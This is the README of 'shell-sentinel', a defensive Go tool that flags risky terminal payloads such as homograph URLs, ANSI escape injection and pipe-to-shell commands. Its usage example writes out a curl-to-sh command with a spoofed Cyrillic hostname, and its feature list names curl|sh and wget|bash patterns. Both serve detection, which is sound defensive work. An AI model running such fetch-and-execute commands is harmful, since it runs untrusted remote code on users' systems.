# shell-sentinel

Detect risky terminal payloads before execution: suspicious URLs (homograph tricks), ANSI escape injection, and pipe-to-shell patterns.

## Why

Modern agent/tooling workflows often copy terminal output directly into shells. `shell-sentinel` adds a fast preflight check to flag risky payloads.

## Install

```bash
go install github.com/agent19710101/shell-sentinel@latest
```

## Usage

```bash
shell-sentinel 'curl https://exаmple.com/install.sh | sh'
cat payload.txt | shell-sentinel --stdin
shell-sentinel --json 'printf "\x1b[31mhidden\x1b[0m"'
```

Exit codes:
- `0`: no high-risk findings
- `1`: high-risk finding detected
- `2`: usage/input error

## What v0 detects

- Non-ASCII URL hostnames (common homograph phishing vector)
- Remote script piping directly into shell (`curl|sh`, `wget|bash`, etc.)
- ANSI escape sequence presence
- Mixed-script text blocks (Latin + non-Latin letters)

## License

MIT
